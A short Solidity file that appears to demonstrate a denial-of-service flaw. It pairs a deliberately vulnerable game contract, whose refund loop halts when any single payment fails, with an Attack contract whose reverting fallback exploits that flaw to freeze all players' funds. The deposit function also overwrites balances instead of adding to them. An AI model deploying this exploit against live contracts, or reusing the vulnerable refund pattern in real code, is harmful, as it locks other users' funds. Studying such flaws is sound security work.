// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    function deposit() external payable {
        require(!refundFinished , "Game Over");
        require(msg.value > 0 , "Please donate ETH");
        balanceOf[msg.sender] = msg.value;
        players.push(msg.sender);
    }

    function refund() external {
        require(!refundFinished , "Game Over");
        uint256 pLength = players.length;
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    fallback() external payable {
        revert("Dos Attack!");
    }

    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}